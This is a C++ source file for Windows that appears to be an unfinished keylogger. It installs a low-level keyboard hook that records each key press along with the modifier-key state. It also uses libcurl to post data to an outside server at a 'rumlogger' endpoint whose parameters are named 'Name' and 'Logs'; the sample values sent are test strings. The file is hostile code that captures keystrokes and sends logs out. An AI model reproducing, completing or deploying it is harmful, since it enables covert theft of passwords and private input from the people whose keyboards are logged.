#define CURL_STATICLIB
#define _WIN32_WINNT 0x0400
#pragma comment( lib, "user32.lib" )

#include <iostream>
#include <Windows.h>
#include <cstdio>
#include <curl/curl.h>
#include <string>

using namespace std;

HHOOK hKeyboardHook;
CURL* curl;

__declspec(dllexport) LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION && (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN))
	{
		const KBDLLHOOKSTRUCT hookedKey = *reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

		auto key = hookedKey.vkCode;
		auto shift = GetAsyncKeyState(VK_SHIFT);
		auto ctrl = GetAsyncKeyState(VK_CONTROL);
		auto alt = GetAsyncKeyState(VK_MENU);

		printf("Keycode = %c, %d %d %d\n", key, shift, ctrl, alt);
	}
	return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

DWORD WINAPI my_HotKey(LPVOID lpParm)
{
	HINSTANCE hInstance = GetModuleHandle(nullptr);
	if (!hInstance) hInstance = LoadLibrary(static_cast<LPCWSTR>(lpParm));
	if (!hInstance) return 2137;

	hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardEvent, hInstance, NULL);

	MSG message;
	while (GetMessage(&message, nullptr, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}

	UnhookWindowsHookEx(hKeyboardHook);
	return 0;
}

size_t writeFunction(void* ptr, size_t size, size_t nmemb, std::string* data) {
	data->append((char*)ptr, size * nmemb);
	return size * nmemb;
}

int work(int argc, char** argv)
{
	curl_easy_setopt(curl, CURLOPT_URL, "https://rumlogger.azurewebsites.net/api/User/AddUserData?Name=test3&Logs=test123");
	curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "");
	auto res = curl_easy_perform(curl);

	return 0;
}


int main(int argc, char** argv)
{
	curl = curl_easy_init();

	auto ret = work(argc, argv);

	curl_easy_cleanup(curl);
	curl = nullptr;

	return ret;
}
